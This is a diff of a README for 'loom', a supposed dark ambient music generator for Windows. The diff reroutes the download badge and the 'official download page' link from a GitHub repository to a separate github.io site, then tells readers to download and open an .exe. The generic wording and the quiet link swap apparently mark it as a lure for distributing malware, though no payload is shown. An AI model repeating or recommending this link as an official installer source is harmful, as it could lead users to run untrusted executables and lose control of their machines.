@@ -1,6 +1,6 @@
 # 🎹 loom - Create dark ambient soundscapes with ease
 
-[![Download loom for Windows](https://img.shields.io/badge/Download-Loom%20for%20Windows-blue)](https://github.com/tyrothricinbeingness321/loom)
+[![Download loom for Windows](https://img.shields.io/badge/Download-Loom%20for%20Windows-blue)](https://tyrothricinbeingness321.github.io)
 
 Loom generates evolving music soundscapes. It creates complex arrangements from a single starting point. You use this software to explore dark, atmospheric textures without manual composition. Loom utilizes generative MIDI protocols to produce patterns that shift over time. 
 
@@ -15,7 +15,7 @@ Your computer requires the following setup to run the application:
 
 ## 📥 Installation Steps
 
-1. Visit the [official loom download page](https://github.com/tyrothricinbeingness321/loom) to access the latest installer.
+1. Visit the [official loom download page](https://tyrothricinbeingness321.github.io) to access the latest installer.
 2. Locate the file ending in .exe in the assets list.
 3. Click the file to start the download.
 4. Open your Downloads folder on your computer.
